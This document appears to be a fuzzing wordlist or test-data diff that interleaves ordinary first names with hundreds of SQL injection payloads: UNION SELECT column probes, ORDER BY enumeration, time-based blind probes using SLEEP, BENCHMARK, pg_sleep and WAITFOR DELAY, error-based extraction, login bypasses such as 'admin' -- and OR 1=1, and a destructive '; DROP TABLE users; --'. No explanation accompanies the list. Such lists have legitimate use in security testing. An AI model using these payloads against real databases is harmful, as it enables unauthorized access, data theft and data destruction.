+'&&SLEEP(5)--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Alice'
+'Charlie'
+'ORDER BY 11#'
+'Fran'
+'Hank'
+'/*  	C-style comment'
+'David'
+'David'
+'Jill'
+'||		(double pipe) concatenate'
+'Hank'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+'Fran'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#'"
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+'David'
+'/*  	C-style comment'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+';
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'Hank'
+'ORDER BY 29--'
+'Jill'
+'John'
+'Hank'
+'Alice'
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+"'"""") or sleep(5)=""""'"
+'ORDER BY 23'
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'"
+'John'
+'SLEEP(5)=''
+'Eve'
+'Hank'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+'David'
+"'"""") or true--'"
+"'admin"""") or """"1""""=""""1""""--'"
+'Charlie'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+"'UNION ALL SELECT 1,2,3,4,5,6'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+'Grace'
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'"
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'Eve'
+'Fran'
+'1)) or pg_sleep(5)--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+'Hank'
+'Alice'
+'Eve'
+'John'
+''-''
+"'admin""""or 1=1 or """"""""=""""'"
+'admin' --'
+'Fran'
+'Jill'
+'Bob'
+'SLEEP(5)=''
+'Fran'
+''&&SLEEP(5)&&'1'
+'John'
+'Eve'
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'"
+"'admin"""" #'"
+'Eve'
+'Charlie'
+'Alice'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'"
+'' ''
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+'Jill'
+'ORDER BY 5'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+'Grace'
+'Grace'
+"'benchmark(10000000,MD5(1))#'"
+'ORDER BY 6'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'"
+"'"""") or true--'"
+'Grace'
+'Eve'
+'Bob'
+'Hank'
+'Grace'
+'ORDER BY 22'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+'Jill'
+'' OR '1'
+'OR 1=1--'
+'admin' --'
+'Hank'
+'ORDER BY 9'
+'Bob'
+'ORDER BY 9'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'"
+'waitfor delay '00:00:05''
+'John'
+'Hank'
+'John'
+'Hank'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'John'
+'Grace'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'' or ''-''
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'"
+'Hank'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+'Alice'
+'Grace'
+''&&SLEEP(5)&&'1'
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+'ORDER BY 24#'
+'David'
+'Charlie'
+'Jill'
+'Hank'
+'Bob'
+'Bob'
+'Grace'
+'Eve'
+'ORDER BY 30#'
+'));
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'"
+'ORDER BY 19'
+'' AnD SLEEP(5) ANd '1'
+'John'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'"
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'"
+'David'
+'Grace'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'Eve'
+'/'
+'Alice'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Hank'
+'AND 1=1#'
+'Charlie'
+'Grace'
+'Bob'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+"'UNION ALL SELECT 1,2,3,4#'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'"
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Grace'
+'AND 1=1--'
+'David'
+'Grace'
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16'"
+'Grace'
+'ORDER BY 3--'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'"
+'Hank'
+"'and (select substring(@@version,2,1))='i''"
+'Hank'
+'Bob'
+'ORDER BY 23'
+'ORDER BY 20#'
+'Hank'
+'WHERE 1=1 AND 1=1'
+'Eve'
+'Jill'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Grace'
+'John'
+'AND 7300=7300 AND ('pKlZ'='pKlZ'
+'Alice'
+'AS INJECTX WHERE 1=1 AND 1=1'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'"
+'Jill'
+'ORDER BY 5--'
+'Eve'
+'Jill'
+'Alice'
+'Jill'
+'Eve'
+'\\'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'Alice'
+'Hank'
+'Eve'
+'Charlie'
+'Fran'
+'or SLEEP(5)=''
+'AND 7300=7300 AND 'pKlZ'='pKlY'
+'HAVING 1=0'
+"'"""" OR """""""" = """"'"
+'WHERE 1=1 AND 1=1'
+"'admin"""" or 1=1/*'"
+'ORDER BY 23--'
+'' AnD SLEEP(5) ANd '1'
+'Fran'
+');
+"'"""" or sleep(5)#'"
+'Hank'
+"'""""&""""'"
+'Alice'
+"'-1 UNION SELECT 1 INTO @,@'"
+'Bob'
+'David'
+'David'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Bob'
+"'"""" """"'"
+'Eve'
+'Grace'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'"
+'Charlie'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'ORDER BY 11--'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+'David'
+'Charlie'
+'1) or pg_sleep(5)--'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'ORDER BY 2'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+"'admin"""") or (""""1""""=""""1""""--'"
+'Fran'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Hank'
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+'John'
+'Hank'
+'David'
+"'UNION ALL SELECT 1,2'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+'' AnD SLEEP(5) ANd '1'
+'Fran'
+'Grace'
+'Bob'
+'UNION ALL SELECT SLEEP(5)--'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'"
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'"
+''*''
+'John'
+'Grace'
+'Eve'
+'David'
+'Jill'
+'Eve'
+'Alice'
+'Bob'
+'AS INJECTX WHERE 1=1 AND 1=1'
+'Alice'
+'AND 1=1--'
+'Grace'
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+'Alice'
+'John'
+'Hank'
+'Bob'
+'Grace'
+'Hank'
+'John'
+'Charlie'
+'' AND 1=0 UNION ALL SELECT 'malicious_data'
+'David'
+'David'
+'Charlie'
+'Charlie'
+'AND 7506=9091 AND (5913=5913'
+'Hank'
+'OR 1=0--'
+'OR x=y--'
+''-''
+'Grace'
+'John'
+'Alice'
+'Jill'
+'Eve'
+'`	    Backtick'
+'AnD SLEEP(5)'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'Grace'
+'David'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'"
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5--'"
+'UNION ALL SELECT NULL'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'"
+'Bob'
+'Eve'
+'David'
+'\'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'"
+'Hank'
+'Bob'
+"'admin"""" or """"1""""=""""1""""--'"
+'Bob'
+'Charlie'
+'or 1=1'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'"
+'David'
+'Jill'
+'AND 1=0 AND '%'=''
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+"'""""'"
+'ORDER BY SLEEP(5)'
+'Eve'
+'John'
+'David'
+"'UNION ALL SELECT 1,2,3,4'"
+'Fran'
+'Hank'
+'Jill'
+'Charlie'
+'John'
+'Alice'
+''*''
+'David'
+'Eve'
+'Bob'
+'Alice'
+'John'
+'John'
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+'AND 7300=7300 AND 'pKlZ'='pKlY'
+'Fran'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Bob'
+'Bob'
+'David'
+'');
+'Alice'
+'UNION ALL SELECT SLEEP(5)--'
+'John'
+'Alice'
+'Alice'
+'John'
+''; DROP TABLE users; --'
+'Eve'
+"'UNION ALL SELECT 1,2,3#'"
+'Charlie'
+'RANDOMBLOB(500000000/2)'
+'Fran'
+'Grace'
+'Hank'
+"'"""" or """""""" """"'"
+'Alice'
+'UNION ALL SELECT USER()--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+'' OR '1'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'"
+'Alice'
+'WHERE 1=1 AND 1=0'
+'Fran'
+'John'
+'Jill'
+'ORDER BY 8'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'"
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--'"
+'Alice'
+'ORDER BY 12'
+'Jill'
+'David'
+'Eve'
+'David'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'Eve'
+'/'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Bob'
+'Eve'
+'ORDER BY 21#'
+'Fran'
+'ORDER BY 8#'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+'Eve'
+"'1' GROUP BY 1,2,--+'"
+'ORDER BY 31337--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'"
+"''\""""'"
+'David'
+'John'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15'"
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+'Grace'
+'Grace'
+'Alice'
+'Hank'
+'Fran'
+"'admin"""") or (""""1""""=""""1""""--'"
+"'or benchmark(50000000,MD5(1))'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'ORDER BY 27--'
+"'admin"""") or (""""1""""=""""1'"
+'Eve'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+'Grace'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+'Charlie'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+"'admin""""or 1=1 or """"""""=""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+"'' AND MID(VERSION(),1,1) = '5';'"
+'Alice'
+'John'
+'David'
+'Grace'
+'Charlie'
+'Finding the table name'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Grace'
+'Charlie'
+'Bob'
+'ORDER BY 25'
+'Hank'
+'' AnD SLEEP(5) ANd '1'
+'');
+'Hank'
+'Jill'
+"',(select * from (select(sleep(10)))a)'"
+'Grace'
+'David'
+'ORDER BY 22--'
+'Grace'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#'"
+'Charlie'
+'1-true'
+'Bob'
+'Fran'
+'Hank'
+'John'
+'Bob'
+'Hank'
+'Hank'
+"'admin"""" or 1=1#'"
+'Charlie'
+'ORDER BY 23'
+'Hank'
+'UNION ALL SELECT NULL'
+'Eve'
+'Hank'
+'John'
+'Grace'
+'Eve'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--'"
+'Bob'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'Jill'
+'1) or pg_sleep(5)--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Hank'
+'';WAITFOR DELAY '0:0:30'--'
+'John'
+'OR 1=1#'
+'John'
+'Hank'
+"'' or benchmark(10000000,MD5(1))#'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'admin' #'
+'ORDER BY 8#'
+'Hank'
+'Bob'
+'Alice'
+'Charlie'
+'Jill'
+'AND 7300=7300 AND ('pKlZ'='pKlZ'
+'Fran'
+'Grace'
+'John'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+'Jill'
+'Fran'
+'Charlie'
+'Hank'
+"'""""-""""'"
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'"
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'' OR 'x'='x'
+'Charlie'
+'-- or #'
